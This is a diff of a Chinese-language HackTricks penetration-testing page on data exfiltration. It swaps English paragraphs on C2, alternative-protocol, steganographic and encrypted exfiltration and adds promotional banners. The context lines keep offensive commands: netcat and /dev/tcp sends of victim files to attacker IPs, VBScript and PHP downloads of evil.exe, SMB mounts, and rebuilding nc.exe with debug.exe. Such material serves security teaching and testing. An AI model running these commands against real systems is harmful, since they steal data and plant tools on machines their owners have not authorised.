@@ -2,23 +2,31 @@
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## 常见的白名单域名用于信息泄露
 
-查看[https://lots-project.com/](https://lots-project.com/)以找到可以被滥用的常见白名单域名
+查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域名
 
-## 复制\&粘贴Base64
+## 复制并粘贴Base64
 
 **Linux**
 ```bash
@@ -177,37 +185,31 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+## Exfiltration
 
-## Introduction
+### Exfiltration Over Command and Control Channel
 
-Exfiltration is the unauthorized transfer of data from a target system. After gaining access to a system, an attacker may want to exfiltrate sensitive information such as user credentials, financial data, or intellectual property. This data can be exfiltrated using various techniques, including network-based exfiltration, data exfiltration over DNS, and exfiltration using cloud storage services.
+Exfiltration over the command and control (C2) channel is a common technique used by attackers to steal data from compromised systems. Attackers can use the existing C2 channel to exfiltrate data in a covert manner, making it difficult for defenders to detect the data exfiltration.
 
-## Techniques
+### Exfiltration Over Alternative Protocols
 
-### Network-Based Exfiltration
+Attackers can also exfiltrate data using alternative protocols such as DNS, ICMP, or HTTPS. By using these alternative protocols, attackers can bypass network security controls that may not inspect traffic on these protocols.
 
-Network-based exfiltration involves sending data outside the target network to a system controlled by the attacker. This can be achieved by using protocols such as HTTP, HTTPS, FTP, or DNS to transfer data to an external server.
+### Exfiltration Over Unmonitored Ports
 
-### Data Exfiltration over DNS
+Attackers can exfiltrate data over ports that are typically not monitored by security devices. By using uncommon ports for exfiltration, attackers can evade detection by traditional security monitoring tools.
 
-Data exfiltration over DNS involves encoding data in DNS queries or responses to bypass network security controls. Attackers can use tools like dnscat2 to exfiltrate data over DNS channels.
+### Exfiltration Using Steganography
 
-### Exfiltration Using Cloud Storage Services
+Steganography is the technique of hiding data within other files to avoid detection. Attackers can use steganography to exfiltrate data by embedding it within image or audio files before exfiltrating them from the compromised system.
 
-Attackers can exfiltrate data by uploading it to cloud storage services such as Dropbox, Google Drive, or OneDrive. This method allows attackers to bypass network security controls and store exfiltrated data in the cloud.
+### Exfiltration Using Data Encoding
 
-## Tools
+Attackers can encode the exfiltrated data to bypass security controls that may inspect data based on known signatures. By encoding the data, attackers can make it appear as benign traffic, making it harder for defenders to identify the exfiltration.
 
-There are various tools available to facilitate data exfiltration during a penetration test. Some popular tools include:
+### Exfiltration Using Encryption
 
-- **Cobalt Strike**: A threat emulation software that includes features for exfiltrating data.
-- **Empire**: A post-exploitation framework that can be used for data exfiltration.
-- **PowerShell**: A powerful scripting language that can be used to exfiltrate data from Windows systems.
-
-## Conclusion
-
-Exfiltration is a critical phase of a penetration test, as it allows the attacker to steal valuable information from the target system. By understanding exfiltration techniques and using the right tools, penetration testers can assess an organization's security posture and help improve its defenses against data exfiltration attacks.
+Encryption can be used to protect exfiltrated data from being intercepted by security devices. By encrypting the exfiltrated data, attackers can ensure that even if the data is intercepted, it cannot be easily read or understood by defenders.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -229,7 +231,9 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## 网络通道
+## NC
+
+NC（Netcat）是一个强大的网络工具，可用于在网络上读取和写入数据。它可以用于创建反向或正向shell、传输文件以及执行任意命令。NC通常用于渗透测试和网络攻击中。
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -241,7 +245,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 上传文件至受害者
+### 将文件上传至受害者
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -270,7 +274,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -302,7 +306,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic 脚本 (VBScript) 是一种基于 Visual Basic 的脚本语言，通常用于 Windows 环境中。VBScript 可以用于执行各种系统管理任务和自动化操作。
+Visual Basic Script (VBScript) 是一种基于对象的脚本语言，通常用于 Windows 环境中。它可以用于执行各种系统管理任务和自动化操作。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -340,7 +344,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，需要注意的是，debug.exe有一个**组装文件大小限制为64 kb**。
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，重要的是要注意`debug.exe`有一个**组装文件大小限制为64 kb**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -350,4 +354,22 @@ wine exe2bat.exe nc.exe nc.txt
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-然后将文本复制粘贴到Windows shell中，将创建一个名为nc.exe的文件。
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+<details>
+
+<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+其他支持HackTricks的方式：
+
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+
+</details>
